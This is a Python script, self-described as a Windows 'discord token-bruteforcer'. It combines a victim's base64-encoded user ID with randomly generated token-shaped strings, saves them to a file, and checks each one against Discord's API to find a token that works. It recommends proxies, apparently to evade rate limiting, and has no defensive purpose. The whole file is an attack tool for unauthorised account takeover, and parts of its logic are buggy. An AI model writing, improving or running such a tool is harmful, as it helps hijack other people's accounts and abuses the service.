import ctypes, os, threading, strgen, base64, requests
class Discord:
    def __init__(self):
        self.regularExpression = ".([a-zA-Z0-9]{6})\.([a-zA-Z0-9]{27})" 
        self.generated = 0

    def generate(self):
        discordToken = strgen.StringGenerator(self.regularExpression).render()
        discordToken = discordToken.replace("..", ".")
        discordToken = str(id) + discordToken 
        print(discordToken)
        self.generated += 1
        self.write(discordToken)
        self.title()

    def new_method(self):
        return self.regularExpression
    
    def write(self, discordToken):
        if os.path.isfile("./tokens.txt"):
            writeToken = open("./tokens.txt", "a")
            writeToken.write(f"{discordToken}\n")
        else:
            open("./tokens.txt", "w").close() 
    def title(self):
        ctypes.windll.kernel32.SetConsoleTitleW(f"?????: {self.generated}")
        
os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW(f"?????")
print("A simple discord token-bruteforcer works in windows only \n I would prefer you to use proxies")
open("./tokens.txt", "w").close()
token = Discord()
amountToGen = int(input("Enter amount of tokens to generate: "))
id = base64.b64encode((input("Enter ID: ")).encode("ascii"))
id = str(id)[2:-1]
for _ in range(amountToGen):
    threading.Thread(target=token.generate).start()
    os.system('cls')
    with open("tokens.txt") as f:
        for line in f:
            token = line.strip("\n")
            headers = {'Content-Type': 'application/json', 'authorization': token}
            url = "https://discordapp.com/api/v6/users/@me/library"
            r = requests.get(url, headers=headers)
            if r.status_code == 200:
                print("{} worked.".format(line.strip("\n")))
            elif r.status_code == 429:
                print("You are being rate limited.")
            elif r.status_code == 504:
                print("Time Out!")
            else:
                print("Token Didn't Worked!")


